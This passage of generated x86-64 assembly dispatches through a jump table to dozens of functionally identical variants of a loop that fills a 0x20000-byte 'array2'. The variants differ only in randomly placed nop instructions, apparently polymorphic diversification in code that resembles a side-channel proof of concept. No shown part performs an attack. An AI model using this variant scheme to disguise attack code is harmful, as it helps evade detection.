	je	.Lmain_win6_var98
	cmpl	$99, %eax
	je	.Lmain_win6_var99
	cmpl	$100, %eax
	je	.Lmain_win6_var100
	cmpl	$101, %eax
	je	.Lmain_win6_var101
	cmpl	$102, %eax
	je	.Lmain_win6_var102
	cmpl	$103, %eax
	je	.Lmain_win6_var103
	cmpl	$104, %eax
	je	.Lmain_win6_var104
	cmpl	$105, %eax
	je	.Lmain_win6_var105
	cmpl	$106, %eax
	je	.Lmain_win6_var106
	cmpl	$107, %eax
	je	.Lmain_win6_var107
	cmpl	$108, %eax
	je	.Lmain_win6_var108
	cmpl	$109, %eax
	je	.Lmain_win6_var109
	cmpl	$110, %eax
	je	.Lmain_win6_var110
	cmpl	$111, %eax
	je	.Lmain_win6_var111
	cmpl	$112, %eax
	je	.Lmain_win6_var112
	cmpl	$113, %eax
	je	.Lmain_win6_var113
	cmpl	$114, %eax
	je	.Lmain_win6_var114
	cmpl	$115, %eax
	je	.Lmain_win6_var115
	cmpl	$116, %eax
	je	.Lmain_win6_var116
	cmpl	$117, %eax
	je	.Lmain_win6_var117
	cmpl	$118, %eax
	je	.Lmain_win6_var118
	cmpl	$119, %eax
	je	.Lmain_win6_var119
	cmpl	$120, %eax
	je	.Lmain_win6_var120
	cmpl	$121, %eax
	je	.Lmain_win6_var121
	cmpl	$122, %eax
	je	.Lmain_win6_var122
	cmpl	$123, %eax
	je	.Lmain_win6_var123
	cmpl	$124, %eax
	je	.Lmain_win6_var124
	cmpl	$125, %eax
	je	.Lmain_win6_var125
	cmpl	$126, %eax
	je	.Lmain_win6_var126
	cmpl	$127, %eax
	je	.Lmain_win6_var127
	cmpl	$128, %eax
	je	.Lmain_win6_var128
	cmpl	$129, %eax
	je	.Lmain_win6_var129
	cmpl	$130, %eax
	je	.Lmain_win6_var130
	cmpl	$131, %eax
	je	.Lmain_win6_var131
	cmpl	$132, %eax
	je	.Lmain_win6_var132
	cmpl	$133, %eax
	je	.Lmain_win6_var133
	cmpl	$134, %eax
	je	.Lmain_win6_var134
	cmpl	$135, %eax
	je	.Lmain_win6_var135
	cmpl	$136, %eax
	je	.Lmain_win6_var136
	cmpl	$137, %eax
	je	.Lmain_win6_var137
	cmpl	$138, %eax
	je	.Lmain_win6_var138
	cmpl	$139, %eax
	je	.Lmain_win6_var139
	cmpl	$140, %eax
	je	.Lmain_win6_var140
	cmpl	$141, %eax
	je	.Lmain_win6_var141
	cmpl	$142, %eax
	je	.Lmain_win6_var142
	cmpl	$143, %eax
	je	.Lmain_win6_var143
	cmpl	$144, %eax
	je	.Lmain_win6_var144
	cmpl	$145, %eax
	je	.Lmain_win6_var145
	cmpl	$146, %eax
	je	.Lmain_win6_var146
	cmpl	$147, %eax
	je	.Lmain_win6_var147
	cmpl	$148, %eax
	je	.Lmain_win6_var148
	cmpl	$149, %eax
	je	.Lmain_win6_var149
	jmp	.Lmain_win6_var0
## Variant 0
.Lmain_win6_var0:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 1
.Lmain_win6_var1:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 2
.Lmain_win6_var2:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 3
.Lmain_win6_var3:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 4
.Lmain_win6_var4:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 5
.Lmain_win6_var5:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 6
.Lmain_win6_var6:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 7
.Lmain_win6_var7:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 8
.Lmain_win6_var8:
	popq	%rax
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 9
.Lmain_win6_var9:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win6_continue
## Variant 10
.Lmain_win6_var10:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 11
.Lmain_win6_var11:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 12
.Lmain_win6_var12:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 13
.Lmain_win6_var13:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 14
.Lmain_win6_var14:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 15
.Lmain_win6_var15:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 16
.Lmain_win6_var16:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 17
.Lmain_win6_var17:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 18
.Lmain_win6_var18:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 19
.Lmain_win6_var19:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 20
.Lmain_win6_var20:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 21
.Lmain_win6_var21:
	popq	%rax
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 22
.Lmain_win6_var22:
	popq	%rax
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 23
.Lmain_win6_var23:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 24
.Lmain_win6_var24:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 25
.Lmain_win6_var25:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 26
.Lmain_win6_var26:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 27
.Lmain_win6_var27:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 28
.Lmain_win6_var28:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 29
.Lmain_win6_var29:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 30
.Lmain_win6_var30:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 31
.Lmain_win6_var31:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 32
.Lmain_win6_var32:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 33
.Lmain_win6_var33:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 34
.Lmain_win6_var34:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 35
.Lmain_win6_var35:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 36
.Lmain_win6_var36:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 37
.Lmain_win6_var37:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 38
.Lmain_win6_var38:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 39
.Lmain_win6_var39:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 40
.Lmain_win6_var40:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 41
.Lmain_win6_var41:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 42
.Lmain_win6_var42:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 43
.Lmain_win6_var43:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 44
.Lmain_win6_var44:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 45
.Lmain_win6_var45:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 46
.Lmain_win6_var46:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 47
.Lmain_win6_var47:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 48
.Lmain_win6_var48:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 49
.Lmain_win6_var49:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 50
.Lmain_win6_var50:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 51
.Lmain_win6_var51:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win6_continue
## Variant 52
.Lmain_win6_var52:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 53
.Lmain_win6_var53:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 54
.Lmain_win6_var54:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 55
.Lmain_win6_var55:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 56
.Lmain_win6_var56:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 57
.Lmain_win6_var57:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
